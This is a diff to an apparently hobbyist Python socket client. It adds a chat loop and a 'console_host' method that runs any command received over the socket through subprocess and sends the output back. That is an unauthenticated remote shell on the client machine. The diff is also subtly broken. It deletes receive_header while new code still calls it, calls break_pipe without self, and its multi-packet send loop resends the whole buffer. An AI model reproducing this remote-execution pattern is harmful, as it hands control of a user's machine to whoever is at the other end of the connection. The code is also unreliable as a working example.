@@ -2,6 +2,7 @@ import qlogger
 import socket
 import time
 import json
+import subprocess
 
 
 class Client:
@@ -74,26 +75,6 @@ class Client:
 				return 0
 
 
-	def receive_header(self):
-		try:
-			file_header = self.socket.recv(4096)
-			self.log.debug("mode: decode")
-			decoded_structure = self.decoder.decode(file_header.decode("utf-8"))
-			self.log.debug(f"\nheader: {decoded_structure}\ntype: {type(decoded_structure)}")
-			# file_header = file_header.decode()
-			# header = file_header.replace(" ", "").strip().split(";")
-			# file_format = header[0]
-			# total_file_size = header[1]
-			# self.log.debug(f"header -> {file_header}")
-		except Exception as e:
-			self.log.exception(e)
-
-		else:
-			self.log.debug("receive_header -> success")
-
-			return decoded_structure
-
-
 	def receive_file(self):
 		try:
 			pass
@@ -113,10 +94,10 @@ class Client:
 		try:
 			if type(data) is not bytes:
 				data = bytes(data, encoding="utf-8")
-			if len(data) >= 4096:
+			if len(data) <= 4096:
 				self.send_header({"packet_size" : len(data), "mode" : "one_packet"})
 				self.socket.send(data)
-			elif len(data) < 4096:
+			elif len(data) > 4096:
 				self.send_header({"packet_size" : len(data), "mode" : "multiple_packet"})
 				for i in range(0, len(data) + 1, 4096):
 					self.socket.send(data)
@@ -126,12 +107,10 @@ class Client:
 		except Exception as e:
 			self.log.exception(e)
 
-			self.send_header({"operation_code" : "failed"})
+			self.send_header({"operation_code" : "error"})
 		else:
 			self.send_header({"operation_code" : "success"})
 			self.log.debug("send_data session -> success")
-
-			return 0
 
 
 	def receive_data(self):
@@ -141,24 +120,88 @@ class Client:
 				packet_size = header["packet_size"]
 				self.log.debug(f"mode -> one packet ({packet_size} B)")
 				data = self.socket.recv(4096)
-				data = data.decode("utf-8")
-				self.log.info(f"accepted info:\n\n\n{data}\n\n")
+				data = data
+				# self.log.info(f"accepted info:\n\n\n{data}\n\n")
+
+				return data
+
 			elif header["mode"] == "multiple_packet":
 				packet_size = header["packet_size"]
 				self.log.debug(f"mode -> multiple packets ({packet_size} B)")
 				data_collection = b""
 				for i in range(0, packet_size + 1, 4096):
 					data_collection += self.socket.recv(4096)
-				self.log.debug("WARNING, A LOT OF INFORMATION")
-				self.log.debug(f"\n{data}")
+				# self.log.debug("WARNING, A LOT OF INFORMATION")
+				# self.log.debug(f"\n{data}")
+
+				return data_collection
 
 		except Exception as e:
 			self.log.exception(e)
 
-			self.send_header({"operation_code" : "failed"})
+			self.send_header({"operation_code" : "error"})
 		else:
 			self.send_header({"operation_code" : "success",})
 			self.log.debug("receive_data session -> success")
+
+
+	def chatting_room(self, nickname="interlocutor:client"):
+		self.send_header({"nickname" : nickname})
+		self.log.debug("sent header")
+		dest_nickname = self.receive_header()["nickname"]
+		self.log.debug("received header")
+		self.log.info(f"your partner is: {dest_nickname}")
+		while True:
+			try:
+				msg = input("msg > ")
+
+				self.send_data(msg)
+				self.log.debug("message sent successfully")
+
+				accepted_msg = self.receive_data()
+				self.log.debug("accepted message")
+				self.log.debug(f"{dest_nickname} says: {accepted_msg}")
+				print(f"{dest_nickname} says: {accepted_msg}")
+
+				self.send_header({"status" : "continue"})
+				status = self.receive_header()["status"]
+				if status == "continue":
+					continue
+				else:
+					self.log.info(f"your partner has ended conversation ({status})")
+					break
+
+			except Exception as e:
+				self.log.exception(e)
+				self.send_header({"status" : "error on client side"})
+
+				self.break_pipe()
+
+			except (KeyboardInterrupt, InterruptedError):
+				self.send_header({"status" : "client broken the connection"})
+				self.log.debug("interrupted")
+
+				self.break_pipe()
+				break
+
+
+	def console_host(self):
+		try:
+			self.log.info("mode: console host")
+			while True:
+				command = self.receive_data().decode("utf-8")
+				self.log.info(f"command: {command}\r\n")
+				status_code, output = subprocess.getstatusoutput(command)
+				self.send_header({"status_code" : status_code, "output" : output.encode("utf-8")})
+				header = self.receive_header()
+				self.log.debug(f"executed. output:\r\n{output}\r\n\r\n")
+				if header["callback_code"] != "continue":
+					self.log.debug(header["callback_code"])
+					break_pipe()
+					break
+
+		except Exception as e:
+			self.log.exception(e)
 
 
 	def break_pipe(self):
